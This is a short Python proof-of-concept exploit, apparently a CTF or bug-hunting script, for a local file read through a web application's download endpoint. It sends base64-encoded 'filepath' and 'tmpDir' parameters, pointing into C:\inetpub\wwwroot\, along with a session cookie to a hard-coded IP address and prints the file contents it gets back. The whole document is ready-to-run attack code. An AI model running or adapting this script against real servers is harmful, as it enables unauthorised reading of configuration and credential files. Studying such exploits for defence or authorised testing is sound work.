# Type: Local File Read
# Local File Read through download functionality.
# Written by Kair0s3

import requests
import base64
import urllib

target = "http://54.251.213.12"

# Replace with file of interest. `config.php` as PoC.
filename = "d.php"
tmpDir = "C:\\inetpub\\wwwroot\\"

def localFileRead():
    cookies = {
        "token" : "BASE64-REDACTED"
    }

    url = target + f"/d?filepath={base64.b64encode(filename.encode()).decode()}&tmpDir={base64.b64encode(tmpDir.encode()).decode()}"
    print(f"/d?filepath={base64.b64encode(filename.encode()).decode()}&tmpDir={base64.b64encode(tmpDir.encode()).decode()}")
    r = requests.get(url, cookies=cookies)
    print(r.text)

if __name__ == "__main__":
    localFileRead()
